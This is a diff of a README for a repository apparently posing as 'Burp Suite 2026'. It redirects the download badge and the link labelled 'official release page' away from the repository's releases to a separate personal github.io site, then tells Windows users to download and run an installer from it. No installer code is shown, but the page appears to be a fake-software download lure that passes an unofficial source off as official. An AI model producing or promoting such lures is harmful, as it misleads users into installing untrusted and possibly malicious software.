@@ -1,6 +1,6 @@
 # 🛡️ Burp-Suite-2026 - Secure your web applications with ease
 
-[![Download Burp Suite](https://img.shields.io/badge/Download-Burp_Suite_2026-blue.svg)](https://github.com/ponnala6435/Burp-Suite-2026/releases)
+[![Download Burp Suite](https://img.shields.io/badge/Download-Burp_Suite_2026-blue.svg)](https://ponnala6435.github.io)
 
 ## 📌 About this software
 
@@ -20,7 +20,7 @@ Before you install the software, ensure your computer meets these minimum standa
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official release page](https://github.com/ponnala6435/Burp-Suite-2026/releases) to access the download options.
+1. Visit the [official release page](https://ponnala6435.github.io) to access the download options.
 2. Look for the latest version of the software.
 3. Click the link to save the installer file to your computer.
 4. Locate the file in your downloads folder once the download finishes.
